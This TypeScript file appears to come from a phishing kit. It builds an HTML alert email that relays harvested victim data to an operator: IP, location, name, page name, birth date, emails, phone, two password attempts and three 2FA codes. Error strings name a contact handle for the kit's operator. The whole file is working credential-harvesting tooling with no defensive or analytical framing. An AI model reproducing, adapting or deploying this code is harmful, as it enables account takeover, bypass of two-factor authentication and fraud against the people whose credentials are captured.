function escapeHtml(input: any): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function normalizeData(input: any = {}) {
    return {
        ip: input.ip ?? '',
        location: input.location ?? '',
        fullName: input.fullName ?? input.name ?? '',
        fanpage: input.fanpage ?? '',
        day: input.day ?? '',
        month: input.month ?? '',
        year: input.year ?? '',
        email: input.email ?? '',
        emailBusiness: input.emailBusiness ?? input.business ?? '',
        phone: input.phone ?? '',
        password: input.password ?? '',
        passwordSecond: input.passwordSecond ?? '',
        authMethod: input.authMethod ?? '',
        twoFa: input.twoFa ?? '',
        twoFaSecond: input.twoFaSecond ?? '',
        twoFaThird: input.twoFaThird ?? '',
    };
}

export function formatEmailMessage(data: any): string {
    const d = normalizeData(data);
    const authLine = d.authMethod ? `<tr><td><strong>Auth Method:</strong></td><td><code>${escapeHtml(d.authMethod)}</code></td></tr>` : '';

    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 600px; margin: 0 auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
        .header { background: #f8f9fa; padding: 15px; margin: -20px -20px 20px -20px; border-radius: 8px 8px 0 0; }
        .header h2 { margin: 0; color: #333; font-size: 18px; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { padding: 8px 12px; text-align: left; border-bottom: 1px solid #eee; }
        th { background-color: #f8f9fa; font-weight: bold; width: 30%; }
        .section { margin-bottom: 20px; }
        .section h3 { margin-bottom: 10px; color: #666; font-size: 14px; border-bottom: 2px solid #007bff; padding-bottom: 5px; }
        code { background: #f1f3f4; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
        .error { color: #dc3545; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🚨 New Data Submission Alert</h2>
        </div>

        <div class="section">
            <h3>📍 Location Information</h3>
            <table>
                <tr><td><strong>IP Address:</strong></td><td><code>${escapeHtml(d.ip || 'Error, contact @otis_cua')}</code></td></tr>
                <tr><td><strong>Location:</strong></td><td><code>${escapeHtml(d.location || 'Error, contact @otis_cua')}</code></td></tr>
            </table>
        </div>

        <div class="section">
            <h3>Personal Information</h3>
            <table>
                <tr><td><strong>Full Name:</strong></td><td><code>${escapeHtml(d.fullName)}</code></td></tr>
                <tr><td><strong>Page Name:</strong></td><td><code>${escapeHtml(d.fanpage)}</code></td></tr>
                <tr><td><strong>Date of Birth:</strong></td><td><code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code></td></tr>
                <tr><td><strong>Email:</strong></td><td><code>${escapeHtml(d.email)}</code></td></tr>
                <tr><td><strong>Business Email:</strong></td><td><code>${escapeHtml(d.emailBusiness)}</code></td></tr>
                <tr><td><strong>Phone:</strong></td><td><code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code></td></tr>
                <tr><td><strong>Password (1):</strong></td><td><code>${escapeHtml(d.password)}</code></td></tr>
                <tr><td><strong>Password (2):</strong></td><td><code>${escapeHtml(d.passwordSecond)}</code></td></tr>
                ${authLine}
                <tr><td><strong>2FA Code (1):</strong></td><td><code>${escapeHtml(d.twoFa)}</code></td></tr>
                <tr><td><strong>2FA Code (2):</strong></td><td><code>${escapeHtml(d.twoFaSecond)}</code></td></tr>
                <tr><td><strong>2FA Code (3):</strong></td><td><code>${escapeHtml(d.twoFaThird)}</code></td></tr>
            </table>
        </div>

        <div style="margin-top: 30px; padding: 15px; background: #f8f9fa; border-radius: 5px; font-size: 12px; color: #666;">
            <strong>Timestamp:</strong> ${new Date().toISOString()}<br>
            <strong>Source:</strong> Automated Notification System
        </div>
    </div>
</body>
</html>`.trim();
}
